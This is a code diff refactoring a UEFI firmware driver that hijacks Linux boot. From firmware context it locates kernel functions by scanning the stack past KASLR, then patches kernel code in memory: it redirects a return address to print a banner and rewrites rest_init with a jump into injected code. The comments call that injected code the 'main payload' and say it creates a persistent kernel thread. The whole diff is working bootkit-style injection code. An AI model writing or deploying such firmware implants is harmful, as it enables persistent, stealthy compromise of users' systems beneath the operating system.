@@ -149,265 +149,573 @@ VerifyEfiEnterVirtualMode(UINT8* cp) {
     return VerifyEfiEnterVirtualModePattern(cp, gInjectConfig.KernelConfig);
 }
 
+//
+// ============================================================================
+// Helper Functions for VirtMemCallback
+// ============================================================================
+//
+
+/**
+ * Find efi_enter_virtual_mode return address on the stack
+ *
+ * Scans the call stack looking for a return address that points to code
+ * matching the efi_enter_virtual_mode pattern. This is the key to finding
+ * the printk address and subsequently all other kernel functions.
+ *
+ * @param Rsp               Stack pointer from AsmGetRsp()
+ * @param ReturnAddress     Output: Found return address
+ * @param ReturnIndex       Output: Stack index where address was found
+ * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
+ */
+EFI_STATUS
+FindEfiEnterVirtualModeReturnAddr(
+    IN  UINT64* Rsp,
+    OUT UINT8** ReturnAddress,
+    OUT UINTN* ReturnIndex
+)
+{
+    UINTN i;
+    UINT8* candidateAddr;
+
+    if (Rsp == NULL || ReturnAddress == NULL || ReturnIndex == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    //
+    // Search for the return address into efi_enter_virtual_mode
+    // We scan from offset 0x28 to 0x48 on the stack
+    //
+    for (i = 0x28; i < 0x48; i++) {
+        //
+        // Check if this looks like a kernel address (high canonical address)
+        //
+        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
+            candidateAddr = (UINT8*)Rsp[i];
+
+            //
+            // Verify if this address points to the expected code pattern
+            //
+            if (VerifyEfiEnterVirtualMode(candidateAddr)) {
+                *ReturnAddress = candidateAddr;
+                *ReturnIndex = i;
+
+                AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+                           "Found efi_enter_virtual_mode return addr @ 0x%llx!\n",
+                           candidateAddr);
+                SerialOutString(StrBuffer);
+
+                return EFI_SUCCESS;
+            }
+        }
+    }
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+               "Did NOT find efi_enter_virtual_mode return addr\n");
+    SerialOutString(StrBuffer);
+
+    return EFI_NOT_FOUND;
+}
+
+/**
+ * Calculate all kernel function addresses from the discovered printk address
+ *
+ * Uses the kernel configuration to calculate offsets to other required
+ * kernel functions. Also fixes up the msleep call in the proc_template.
+ *
+ * @param EevmReturnAddr    The efi_enter_virtual_mode return address
+ * @return EFI_SUCCESS if successful
+ */
+EFI_STATUS
+CalculateKernelFunctionAddresses(
+    IN UINT8* EevmReturnAddr
+)
+{
+    INT32 offset;
+    UINT8* cp;
+
+    if (EevmReturnAddr == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    //
+    // Calculate printk address from the call instruction
+    // The call instruction is at offset 0x10 from the return address
+    //
+    offset = *(INT32*)(EevmReturnAddr + 0x10);
+    printk = (EevmReturnAddr + 0x14) + offset;
+
+    //
+    // Use kernel configuration to calculate other function addresses
+    //
+    __kmalloc = CalculateKernelAddress(printk,
+                                       gInjectConfig.KernelConfig->PrintkToKmalloc);
+    msleep = CalculateKernelAddress(printk,
+                                    gInjectConfig.KernelConfig->PrintkToMsleep);
+    kthread_create_on_node = CalculateKernelAddress(printk,
+                                                    gInjectConfig.KernelConfig->PrintkToKthreadCreateOnNode);
+
+    //
+    // Fix up the msleep call in our kthread code template
+    //
+    cp = &proc_template[17];
+    *(UINT64*)cp = (UINT64)msleep;
+
+    //
+    // Log the discovered addresses
+    //
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Kernel: %a\n",
+               gInjectConfig.KernelConfig->VersionString);
+    SerialOutString(StrBuffer);
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+               "printk = 0x%llx, __kmalloc = 0x%llx, msleep = 0x%llx, kthread_create_on_node = 0x%llx\n",
+               printk, __kmalloc, msleep, kthread_create_on_node);
+    SerialOutString(StrBuffer);
+
+    return EFI_SUCCESS;
+}
+
+/**
+ * Install Patch 1: Printk banner message
+ *
+ * Patches the kernel code immediately before the efi_enter_virtual_mode
+ * return address to call printk with our banner message. This allows us
+ * to announce ourselves during boot.
+ *
+ * @param Rsp               Stack pointer
+ * @param EevmReturnAddr    The efi_enter_virtual_mode return address
+ * @param ReturnIndex       Stack index of the return address
+ * @return EFI_SUCCESS if patch installed successfully
+ */
+EFI_STATUS
+InstallPatch1_PrintkBanner(
+    IN OUT UINT64* Rsp,
+    IN     UINT8* EevmReturnAddr,
+    IN     UINTN ReturnIndex
+)
+{
+    UINTN i, j;
+    UINT8* cp;
+
+    if (Rsp == NULL || EevmReturnAddr == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    //
+    // Calculate destination for patch code
+    // We write immediately before the return address in already-executed code
+    //
+    destptr = EevmReturnAddr - (sizeof(banner) + sizeof(printk_banner_template));
+
+    //
+    // Copy the banner string
+    //
+    for (i = 0; i < sizeof(banner); i++) {
+        destptr[i] = banner[i];
+    }
+
+    //
+    // Copy the printk call template
+    //
+    for (j = 0; j < sizeof(printk_banner_template); j++) {
+        destptr[i + j] = printk_banner_template[j];
+    }
+
+    //
+    // Fix up the addresses in the patched code
+    // 1. mov rdi, Message1 (pointer to banner string)
+    //
+    cp = destptr + (sizeof(banner) + 4);
+    *(INT32*)cp = (INT32)(INT64)destptr;
+
+    //
+    // 2. call printk (relative call)
+    //
+    cp += (4 + 1);
+    PUT_FIXUP(cp, printk);
+
+    //
+    // Modify the stack return address to point to our patched code
+    //
+    Rsp[ReturnIndex] = (UINT64)(destptr + sizeof(banner));
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Patch 1 installed @ 0x%llx\n", destptr);
+    SerialOutString(StrBuffer);
+
+    return EFI_SUCCESS;
+}
+
+/**
+ * Find arch_call_rest_init address in start_kernel
+ *
+ * Searches the stack for the start_kernel return address by looking for
+ * a sequence of call instructions followed by mfence. The last call before
+ * mfence is arch_call_rest_init.
+ *
+ * @param Rsp                   Stack pointer
+ * @param StartIndex            Index to start searching from
+ * @param ArchCallRestInit      Output: Address of arch_call_rest_init
+ * @param StartKernelRetAddr    Output: start_kernel return address
+ * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
+ */
+EFI_STATUS
+FindArchCallRestInit(
+    IN  UINT64* Rsp,
+    IN  UINTN StartIndex,
+    OUT UINT8** ArchCallRestInit,
+    OUT UINT8** StartKernelRetAddr
+)
+{
+    UINTN i, j;
+    UINT8* cp;
+    BOOLEAN found;
+    INT32 offset;
+
+    if (Rsp == NULL || ArchCallRestInit == NULL || StartKernelRetAddr == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    //
+    // Search further up the stack for start_kernel return address
+    //
+    for (i = StartIndex + 1; i < 0x40; i++) {
+        if ((Rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
+            cp = (UINT8*)Rsp[i];
+            found = TRUE;
+
+            //
+            // Verify this looks like start_kernel by checking for
+            // at least 10 consecutive call instructions
+            //
+            for (j = 0; j < 10; j++) {
+                if (*cp != 0xe8) {  // 0xe8 = call opcode
+                    found = FALSE;
+                    break;
+                }
+                cp += 5;  // call instruction is 5 bytes
+            }
+
+            if (found) {
+                *StartKernelRetAddr = (UINT8*)Rsp[i];
+
+                //
+                // Skip over remaining call instructions until we find mfence
+                //
+                while (*cp == 0xe8) {
+                    cp += 5;
+                }
+
+                //
+                // Check for mfence instruction (0x0f 0xae 0xf0)
+                //
+                if (*cp == 0x0f && *(cp + 1) == 0xae && *(cp + 2) == 0xf0) {
+                    //
+                    // Back up to the last call instruction (arch_call_rest_init)
+                    //
+                    cp -= 4;  // Point to offset within call instruction
+                    offset = *(INT32*)cp;
+                    *ArchCallRestInit = (cp + 4) + offset;
+
+                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+                               "Found start_kernel_retaddr @ 0x%llx\n", *StartKernelRetAddr);
+                    SerialOutString(StrBuffer);
+
+                    AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+                               "arch_call_rest_init = 0x%llx\n", *ArchCallRestInit);
+                    SerialOutString(StrBuffer);
+
+                    return EFI_SUCCESS;
+                }
+                else {
+                    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Mfence not found\n");
+                    SerialOutString(StrBuffer);
+                }
+            }
+        }
+    }
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Did NOT find start_kernel return addr\n");
+    SerialOutString(StrBuffer);
+
+    return EFI_NOT_FOUND;
+}
+
+/**
+ * Find rest_init and the complete(&kthreadd_done) call within it
+ *
+ * Analyzes arch_call_rest_init to find rest_init, then locates the
+ * complete(&kthreadd_done) call that we need to patch.
+ *
+ * @param ArchCallRestInit      Address of arch_call_rest_init
+ * @param RestInit              Output: Address of rest_init
+ * @param CompleteCall          Output: Address of complete() call
+ * @param ReturnFromPatch       Output: Address to return to after patch
+ * @return EFI_SUCCESS if found, EFI_NOT_FOUND otherwise
+ */
+EFI_STATUS
+FindRestInitCompleteCall(
+    IN  UINT8* ArchCallRestInit,
+    OUT UINT8** RestInit,
+    OUT UINT8** CompleteCall,
+    OUT UINT8** ReturnFromPatch
+)
+{
+    UINT8* cp;
+    INT32 offset;
+
+    if (ArchCallRestInit == NULL || RestInit == NULL ||
+        CompleteCall == NULL || ReturnFromPatch == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    cp = ArchCallRestInit;
+
+    //
+    // Verify arch_call_rest_init function prologue:
+    //   nop (multi-byte)
+    //   push rbp
+    //   mov rbp, rsp
+    //   call rest_init
+    //
+    if (*cp != 0x0f || *(cp + 5) != 0x55 || *(cp + 6) != 0x48 ||
+        *(cp + 7) != 0x89 || *(cp + 8) != 0xe5 || *(cp + 9) != 0xe8) {
+        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+                   "Failed to verify arch_call_rest_init prologue\n");
+        SerialOutString(StrBuffer);
+        return EFI_NOT_FOUND;
+    }
+
+    //
+    // Extract rest_init address from call instruction
+    //
+    cp += 10;  // Point to offset within call instruction
+    offset = *(INT32*)cp;
+    *RestInit = (cp + 4) + offset;
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "rest_init = 0x%llx\n", *RestInit);
+    SerialOutString(StrBuffer);
+
+    //
+    // Find the complete(&kthreadd_done) call in rest_init
+    // Use kernel configuration for the offset
+    //
+    cp = *RestInit + gInjectConfig.KernelConfig->RestInitToCompleteOffset;
+
+    //
+    // Verify this is a call instruction
+    //
+    if (*cp != 0xe8) {
+        AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+                   "Expected call instruction at rest_init+0x%x, found 0x%x\n",
+                   gInjectConfig.KernelConfig->RestInitToCompleteOffset, *cp);
+        SerialOutString(StrBuffer);
+        return EFI_NOT_FOUND;
+    }
+
+    *ReturnFromPatch = cp;
+    cp++;  // Point to offset
+    offset = *(INT32*)cp;
+    *CompleteCall = (cp + 4) + offset;
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "complete = 0x%llx\n", *CompleteCall);
+    SerialOutString(StrBuffer);
+
+    return EFI_SUCCESS;
+}
+
+/**
+ * Install Patch 2: Kernel thread creation
+ *
+ * Installs the kernel thread creation code that will run after kthreadd
+ * is initialized but before the system goes multi-threaded. This is the
+ * main payload that creates our persistent thread.
+ *
+ * @param StartKernelRetAddr    Address in start_kernel to write patch code
+ * @param ReturnFromPatch       Address to return to after patch executes
+ * @param CompleteCall          Address of complete(&kthreadd_done) function
+ * @return EFI_SUCCESS if patch installed successfully
+ */
+EFI_STATUS
+InstallPatch2_KthreadCreate(
+    IN UINT8* StartKernelRetAddr,
+    IN UINT8* ReturnFromPatch,
+    IN UINT8* CompleteCall
+)
+{
+    UINT8* cp;
+    UINTN i;
+
+    if (StartKernelRetAddr == NULL || ReturnFromPatch == NULL || CompleteCall == NULL) {
+        return EFI_INVALID_PARAMETER;
+    }
+
+    //
+    // Write the proc_template (thread code + data) immediately before patch_2
+    // This goes in already-executed init code that will be reclaimed
+    //
+    cp = StartKernelRetAddr - (sizeof(patch_code_2) + sizeof(proc_template));
+    for (i = 0; i < sizeof(proc_template); i++) {
+        *cp++ = proc_template[i];
+    }
+
+    //
+    // Write the patch_2 code (kthread allocation and creation)
+    //
+    patch_2 = StartKernelRetAddr - sizeof(patch_code_2);
+    cp = patch_2;
+    for (i = 0; i < sizeof(patch_code_2); i++) {
+        *cp++ = patch_code_2[i];
+    }
+
+    //
+    // Fix up the call addresses in patch_2
+    //
+
+    // 1. call __kmalloc
+    cp = patch_2 + 0x13;
+    PUT_FIXUP(cp, __kmalloc);
+
+    // 2. call kthread_create_on_node
+    cp = patch_2 + 0x3d;
+    PUT_FIXUP(cp, kthread_create_on_node);
+
+    // 3. call complete(&kthreadd_done)
+    cp = patch_2 + (sizeof(patch_code_2) - 9);
+    PUT_FIXUP(cp, CompleteCall);
+
+    // 4. jmp back to rest_init
+    cp = patch_2 + (sizeof(patch_code_2) - 4);
+    PUT_FIXUP(cp, (ReturnFromPatch + 5));
+
+    //
+    // Patch the rest_init() code to jump to our patch_2
+    //
+    cp = ReturnFromPatch;
+    *cp = 0xe9;  // direct near jmp opcode
+    cp++;
+    PUT_FIXUP(cp, patch_2);
+
+    AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Patch 2 installed @ 0x%llx\n", patch_2);
+    SerialOutString(StrBuffer);
+
+    return EFI_SUCCESS;
+}
+
+/**
+ * SetVirtualAddressMap (SVAM) callback
+ *
+ * This callback is invoked during Linux kernel boot when the system
+ * transitions from physical to virtual address mode. At this point,
+ * KASLR has already occurred, so we can discover kernel function
+ * addresses and install our patches.
+ *
+ * The callback performs the following steps:
+ * 1. Find efi_enter_virtual_mode return address on the stack
+ * 2. Calculate kernel function addresses (printk, __kmalloc, etc.)
+ * 3. Install Patch 1: Printk banner message
+ * 4. Find arch_call_rest_init and rest_init
+ * 5. Install Patch 2: Kernel thread creation code
+ *
+ * @param Event     The event that triggered this callback
+ * @param Context   Optional context (unused)
+ */
 VOID
 EFIAPI
 VirtMemCallback(
 	IN EFI_EVENT Event,
 	IN VOID* Context
-) {
+)
+{
+	EFI_STATUS efiStatus;
 	UINT64* rsp;
-	BOOLEAN found;
-	INT32 offset;
-	UINT8* eevm_retaddr; // enter_efi_virtual_mode return address
-	UINT8* start_kernel_retaddr;
-	UINT8* cp;
+	UINT8* eevmReturnAddr;
+	UINTN retaddrIndex;
+	UINT8* startKernelReturnAddr;
+	UINT8* restInitAddr;
+	UINT8* completeAddr;
+	UINT8* returnFromPatch;
 
-	int i, j, retaddr_index;
+	UNREFERENCED_PARAMETER(Event);
+	UNREFERENCED_PARAMETER(Context);
 
-	// We are called from RuntimeDriverSetVirtualAddressMap() (return addr @ *$esp)
-	// Further up the call frame stack is the return address into efi_enter_virtual_mode in linux boot code.
-	// Scan for the return address into efi_enter_virtual_mode.
-	// We are looking for code similar to the following (efi_enter_virtual_mode_template above):
 	//
-	//    0xffffffffb63eb9c5:  mov    rsi, rax
-	//    0xffffffffb63eb9c8 : test   rax, rax
-	//    0xffffffffb63eb9cb : je     0xffffffffb63eb9db
-	//    0xffffffffb63eb9cd : mov    rdi, 0xffffffffb57bcd40 <- Verify "\0013efi: Unable to switch EFI into virtual mode(status = % lx)!\n"
-	//    0xffffffffb63eb9d4 : call   0xffffffffb4da1d56 <- printk addresss
-	//    0xffffffffb63eb9d9 : jmp    0xffffffffb63eba08
-	//    0xffffffffb63eb9db : call   0xffffffffb642f360
-
+	// Get current stack pointer to search for kernel return addresses
+	//
 	rsp = AsmGetRsp();
 	printk = NULL;
 
-	// Search for the return address into efi_enter_virtual_mode
-	for (i = 0x28; i < 0x48; i++) {
-		if ((rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
-			eevm_retaddr = (UINT8*)rsp[i];
-			found = VerifyEfiEnterVirtualMode(eevm_retaddr);
-			if (found) {
-				retaddr_index = i;
-				break;
-			}
-		}
-	}
-	if (found) {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Found efi_enter_virtual_mode return addr @ 0x%llx!\n", eevm_retaddr);
-		SerialOutString(StrBuffer);
-
-		// Calculate printk address from the call instruction
-		offset = *(INT32*)(eevm_retaddr + 0x10);
-		printk = (eevm_retaddr + 0x14) + offset;
-
-		// Use kernel configuration to calculate other function addresses
-		__kmalloc = CalculateKernelAddress(printk, gInjectConfig.KernelConfig->PrintkToKmalloc);
-		msleep = CalculateKernelAddress(printk, gInjectConfig.KernelConfig->PrintkToMsleep);
-		kthread_create_on_node = CalculateKernelAddress(printk, gInjectConfig.KernelConfig->PrintkToKthreadCreateOnNode);
-
-		// Fix up the msleep call in our kthread code template
-		cp = &proc_template[17];
-		*(UINT64*)cp = (UINT64)msleep;
-
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Kernel: %a\n", gInjectConfig.KernelConfig->VersionString);
-		SerialOutString(StrBuffer);
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Offset = 0x%lx, printk = 0x%llx, __kmalloc = 0x%llx, msleep = 0x%llx, retaddr_index = 0x%x\n", offset, printk, __kmalloc, msleep, retaddr_index);
-		SerialOutString(StrBuffer);
-	}
-	else {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Did NOT find efi_enter_virtual_mode return addr\n");
-		SerialOutString(StrBuffer);
-		return; // We didn't find what we were looking for....
-	}
-
-	// We are in a firmware context here, not kernel, so we can't call linux kernel code directly.
-	// Instead, we patch the linux code to printk our entry message when it returns to efi_enter_virtual_mode
-	// This requires adjusting the efi_enter_virtual_mode return address on the stack.
-	// There is no change to functionality since we are overwriting code that has already
-	// executed and efi_enter_virtual_mode is only called once per boot.
-	// 
-	// Copy the printk call into kernel memory so it looks something like this (below):
-	// This is patch_point_1 (overwrite of efi_enter_virtual_mode code).
 	//
-	// Message1:
-	//   "\001\063<banner>"
-	// New_Return_Addr:
-	// push rax
-	// mov  rdi, Message1
-	// call printk
-	// pop  rax
-	// Orig_Return_Addr:
-	// mov  rsi, rax
-	// ...
+	// Step 1: Find efi_enter_virtual_mode return address
 	//
-	destptr = eevm_retaddr - (sizeof(banner) + sizeof(printk_banner_template));
+	efiStatus = FindEfiEnterVirtualModeReturnAddr(rsp, &eevmReturnAddr, &retaddrIndex);
+	if (EFI_ERROR(efiStatus)) {
+		return;  // Failed to find return address
+	}
 
-	// Copy the banner string
-	for (i = 0; i < sizeof(banner); i++) {
-		destptr[i] = banner[i];
-	}
-	// Copy the call to printk
-	for (j = 0; j < sizeof(printk_banner_template); j++) {
-		destptr[i + j] = printk_banner_template[j];
-	}
-	// Now fix up the correct addresses for the mov rdi and call print insns
-	cp = destptr + (sizeof(banner) + 4); // mov rdi, Message1
-	*(INT32*)cp = (INT32)(INT64)destptr;
-	cp += (4 + 1); // offset call printk
-	PUT_FIXUP(cp, printk); // call printk
-	// Finally overwrite the stack return address to come back to our newly patched code
-	rsp[retaddr_index] = (UINT64)(destptr + sizeof(banner));
-
-	// Next look further up the stack for the sequence of call instructions in start_kernel
-	start_kernel_retaddr = NULL;
-	for (i = retaddr_index + 1; i < 0x40; i++) {
-		if ((rsp[i] & 0xFFFFFFFF00000000L) == 0xFFFFFFFF00000000L) {
-			cp = (UINT8*)rsp[i];
-			found = 1;
-			// Are the next 10 insns call instructions?
-			for (j = 0; j < 10; j++) {
-				if (*cp != 0xe8) {
-					found = 0;
-					break;
-				}
-				cp += 5;
-			}
-			if (found) {
-				start_kernel_retaddr = (UINT8*)rsp[i];
-				// Keep going until we hit the mfence after call to arch_call_rest_init()
-				while (*cp == 0xe8) { // Skip over remaining call insns
-					cp += 5;
-				}
-				if (*cp == 0x0f && *(cp + 1) == 0xae && *(cp + 2) == 0xf0) {
-					cp -= 4; // backup to the call arch_call_rest_init() insn offset
-					offset = *(INT32*)cp;
-					arch_call_rest_init = (cp + 4) + offset;
-					AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Mfence found: arch_call_rest_init = 0x%llx offset = 0x%x\n", arch_call_rest_init, offset);
-					SerialOutString(StrBuffer);
-				}
-				else {
-					found = 0;
-					AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Mfence not found\n");
-					SerialOutString(StrBuffer);
-				}
-				break;
-			}
-		}
-	}
-	if (found) {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Found start_kernel_retaddr @ 0x%llx, index = 0x%x\n", start_kernel_retaddr, i);
+	//
+	// Step 2: Calculate kernel function addresses
+	//
+	efiStatus = CalculateKernelFunctionAddresses(eevmReturnAddr);
+	if (EFI_ERROR(efiStatus)) {
+		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+		           "Failed to calculate kernel addresses: %r\n", efiStatus);
 		SerialOutString(StrBuffer);
-	}
-	else {
-		AsciiSPrint(StrBuffer, sizeof(StrBuffer), "Did NOT find start_kernel return addr\n");
-		SerialOutString(StrBuffer);
-	}
-
-	if (arch_call_rest_init == NULL) {
 		return;
 	}
-	// arch_call_rest_init() calls rest_init(), which creates the kernel_init and kernel_kthreadd
-	// kernel threads. Once kthreadd is completed, the next call is to schedule_preempt_disabled(), which
-	// begins launching waiting processes, one of which cleans up init space. Since we are patching into
-	// init space, we need to create our own kernel thread after complete(&kthreadd) but before
-	// schedule_preempt_disabled() is called.
 
-	cp = arch_call_rest_init;
-	// Look for:
-	//   nop
-	//   push rbp
-	//   mov  rbp, rsp
-	//   call rest_init
 	//
-	if (*cp != 0x0f || *(cp + 5) != 0x55 || *(cp + 6) != 0x48 || *(cp + 7) != 0x89 || *(cp + 8) != 0xe5 || *(cp + 9) != 0xe8) {
-		return; // failure finding rest_init
-	}
-	cp += 10; // point to rest_init offset
-	offset = *(INT32*)cp;
-	rest_init = (cp + 4) + offset;
-	AsciiSPrint(StrBuffer, sizeof(StrBuffer), "rest_init = 0x%llx\n", rest_init);
-	SerialOutString(StrBuffer);
-
-	// Initial code in rest_init() looks like this:
-	//    0xffffffffa4ff7e13:  mov    rdi,0xffffffffa667e8e0           # &kthreadd_done
-	//    0xffffffffa4ff7e1a:  mov    DWORD PTR[rip + 0x1563a20], 0x1  # system_state = SCHEDULING
-	//	  0xffffffffa4ff7e24:  call   0xffffffffa4500b10               # complete(&kthreadd_done)
-	//	  0xffffffffa4ff7e29 : call   0xffffffffa50013c0               # schedule_preempt_disabled() - goes multi-thread here 
-	//	  0xffffffffa4ff7e2e : mov    edi, 0xe1                        # CPUHP_ONLINE
-	//	  0xffffffffa4ff7e33 : call   0xffffffffa44e87e0               # cpu_startup_entry(CPUHP_ONLINE)   
-	//	  0xffffffffa4ff7e38 : pop    rbp
-	//    0xffffffffa4ff7e39:  ret
-	// 
-	// Patched code looks like this:
-    //    0xffffffffa4ff7e13:  mov    rdi,0xffffffffa667e8e0           # &kthreadd_done
-	//    0xffffffffa4ff7e1a:  mov    DWORD PTR[rip + 0x1563a20], 0x1  # system_state = SCHEDULING
-	//	  0xffffffffa4ff7e24:  jmp    patch_2                          # patch_2 code below
-	//     return_from_patch:
-	//	  0xffffffffa4ff7e29 : call   0xffffffffa50013c0               # schedule_preempt_disabled() - goes multi-thread here 
-	//	  0xffffffffa4ff7e2e : mov    edi, 0xe1                        # CPUHP_ONLINE
-	//	  0xffffffffa4ff7e33 : call   0xffffffffa44e87e0               # cpu_startup_entry(CPUHP_ONLINE)   
-	//	  0xffffffffa4ff7e38 : pop    rbp
-	//    0xffffffffa4ff7e39:  ret
+	// Step 3: Install Patch 1 - Printk banner
 	//
-	//  Where patch_2 looks like this:
-	//    patch_2:
-	//             push rdi                               # save &kthreadd_done
-	//             ...<allocate new UEFI kernel thread>
-	//             pop  rdi                               # restore &kthreadd_done
-	//             call 0xffffffffa4500b10                # complete(&kthreadd_done)
-	//             jmp  0xffffffffa4ff7e29                # resume rest_init() code
-	//
-	// Use kernel configuration for offset to complete() call
-	cp = rest_init + gInjectConfig.KernelConfig->RestInitToCompleteOffset;
-	if (*cp != 0xe8) {
-		// Something not right, this should be a call insn
+	efiStatus = InstallPatch1_PrintkBanner(rsp, eevmReturnAddr, retaddrIndex);
+	if (EFI_ERROR(efiStatus)) {
+		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+		           "Failed to install Patch 1: %r\n", efiStatus);
+		SerialOutString(StrBuffer);
 		return;
 	}
-	return_from_patch = cp;
-	cp++; // Point to offset
-	offset = *(INT32*)cp;
-	complete = (cp + 4) + offset;
-	AsciiSPrint(StrBuffer, sizeof(StrBuffer), "complete = 0x%llx\n", complete);
+
+	//
+	// Step 4: Find arch_call_rest_init
+	//
+	efiStatus = FindArchCallRestInit(rsp, retaddrIndex,
+	                                 &arch_call_rest_init,
+	                                 &startKernelReturnAddr);
+	if (EFI_ERROR(efiStatus)) {
+		return;  // Failed to find arch_call_rest_init
+	}
+
+	//
+	// Step 5: Find rest_init and complete(&kthreadd_done) call
+	//
+	efiStatus = FindRestInitCompleteCall(arch_call_rest_init,
+	                                     &restInitAddr,
+	                                     &completeAddr,
+	                                     &returnFromPatch);
+	if (EFI_ERROR(efiStatus)) {
+		return;  // Failed to find rest_init or complete call
+	}
+
+	rest_init = restInitAddr;
+	complete = completeAddr;
+
+	//
+	// Step 6: Install Patch 2 - Kernel thread creation
+	//
+	efiStatus = InstallPatch2_KthreadCreate(startKernelReturnAddr,
+	                                        returnFromPatch,
+	                                        completeAddr);
+	if (EFI_ERROR(efiStatus)) {
+		AsciiSPrint(StrBuffer, sizeof(StrBuffer),
+		           "Failed to install Patch 2: %r\n", efiStatus);
+		SerialOutString(StrBuffer);
+		return;
+	}
+
+	//
+	// All patches installed successfully
+	//
+	AsciiSPrint(StrBuffer, sizeof(StrBuffer), "All patches installed successfully!\n");
 	SerialOutString(StrBuffer);
-	//
-	// Setup code for patch_2. After it runs it will execute jmp back into the remaining rest_init() code.
-	// We will overwrite start_kernel code immediately prior to start_kernel_retaddr. This won't change
-	// functionality since all that code has already run, it only runs once per boot, and will be reclaimed
-	// once the system goes multi-threaded.
-	// 
-
-    // First, write the proc_template that our patch code will be using
-	// This goes immediately prior to the patch_2 kthread allocation code
-	cp = start_kernel_retaddr - (sizeof(patch_code_2) + sizeof(proc_template));
-	for (i = 0; i < sizeof(proc_template); i++) {
-		*cp++ = proc_template[i];
-	}
-
-	//
-	// Next write the new code to allocate our kthread to patch_2
-	//
-	patch_2 = start_kernel_retaddr - sizeof(patch_code_2);
-	cp = patch_2;
-	for (i = 0; i < sizeof(patch_code_2); i++) {
-		*cp++ = patch_code_2[i];
-	}
-
-	cp = patch_2 + 0x13; // Fixup call to __kmalloc
-	PUT_FIXUP(cp, __kmalloc);
-	cp = patch_2 + 0x3d; // Fixup call to kthread_create_on_node
-	PUT_FIXUP(cp, kthread_create_on_node);
-	cp = patch_2 + (sizeof(patch_code_2) - 9); // Fixup call to complete
-	PUT_FIXUP(cp, complete);
-	cp = patch_2 + (sizeof(patch_code_2) - 4); // Fixup the jump back into rest_init()
-	PUT_FIXUP(cp, (return_from_patch + 5));
-
-
-	// Next, patch the rest_init() code with a jmp to return_from_patch.
-	cp = return_from_patch;
-	*cp = 0xe9; // direct near jmp to patch_2
-	cp++; // point to offset
-	PUT_FIXUP(cp, patch_2);
-
-	//	CpuDeadLoop(); // Execution will hang here
 }
 
 EFI_STATUS
